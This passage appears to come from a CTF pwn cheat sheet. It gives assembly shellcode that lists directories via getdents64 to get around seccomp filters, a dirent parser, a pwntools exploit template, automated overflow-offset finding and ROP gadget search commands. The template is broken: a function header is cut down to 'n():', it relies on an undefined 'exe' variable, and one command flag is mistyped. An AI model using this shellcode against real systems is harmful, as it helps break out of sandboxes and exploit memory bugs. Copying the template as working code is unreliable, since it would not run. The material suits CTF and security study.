  mov rsi, rsp
  sub rsi, rdx
  push 0xd9
  pop rax
  syscall

  push 1
  pop rdi
  mov edx, eax
  push 1
  pop rax
  syscall

  push 60
  pop rax
  syscall
''')
```

**Parsing linux_dirent64 output:**
```python
import struct

def parse_dirents(data):
    names = []
    i = 0
    while i < len(data):
        if len(data[i:]) < 19: break
        ino, off, reclen = struct.unpack_from('<QQH', data, i)
        if reclen == 0: break
        name_end = data.index(b'\x00', i + 19)
        names.append(data[i+19:name_end].decode(errors='replace'))
        i += reclen
    return names
```

**Key insight:** `getdents64` opens a raw listing without forking a process or using path strings beyond the directory open. Works under orw-only seccomp (open=2, getdents64=217, write=1 all permitted). If you only have a file fd (not dir), open the parent dir with `openat(AT_FDCWD, ".", O_RDONLY|O_DIRECTORY)` first. Useful for flag-file discovery when filename is randomized.

---

## pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

n():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

### Automated Offset Finding via Corefile

Automatically determine buffer overflow offset without manual `cyclic -l`:
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
ROPgadget -binary libc.so.6 | grep retf   # Find retf gadget in libc
objdump -d libc.so.6 | grep -w retf       # Alternative retf search
```
